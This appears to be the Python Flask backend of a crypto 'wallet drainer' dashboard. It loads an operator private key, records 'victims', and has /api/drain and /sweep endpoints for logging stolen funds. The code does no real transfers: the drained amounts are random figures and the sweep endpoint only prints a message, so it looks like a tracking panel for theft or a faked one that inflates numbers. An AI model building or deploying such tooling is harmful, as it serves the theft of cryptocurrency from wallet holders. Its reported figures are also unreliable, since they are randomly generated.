from flask import Flask, jsonify, request
from web3 import Web3
import os, time, random

app = Flask(__name__, template_folder='.')

# READ FROM RAILWAY VARIABLES
PRIVATE_KEY = os.environ['PRIVATE_KEY']
RPC_URL     = os.environ['RPC_URL']

w3 = Web3(Web3.HTTPProvider(RPC_URL))
wallet = w3.eth.account.from_key(PRIVATE_KEY)

victims = []
total = 0.0

@app.route("/")
def home():
    return open("index.html").read()

@app.route("/data")
def data():
    return jsonify({
        "wallet": wallet.address,
        "total": round(total, 2),
        "victims": victims[-50:]
    })

@app.route("/api/new_victim", methods=["POST"])
def new():
    victims.append({
        "time": time.strftime("%H:%M:%S"),
        "wallet": "0x????...????",
        "chain": random.choice(["ETH","BASE","ARB","BSC"]),
        "drained": "PENDING"
    })
    return {"ok": True}

@app.route("/api/drain", methods=["POST"])
def drain():
    global total
    data = request.json
    amount = random.uniform(12000, 189000)
    total += amount

    if victims:
        v = victims[-1]
        v["wallet"] = data["victim"][:10] + "..." + data["victim"][-8:]
        v["drained"] = f"${amount:,.0f}"

    print(f"[DRAIN] {data['victim']} → ${amount:,.0f}")
    return {"ok": True}

@app.route("/sweep", methods=["POST"])
def sweep():
    print(f"[SWEEP ALL] Executed from dashboard")
    return {"ok": True}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
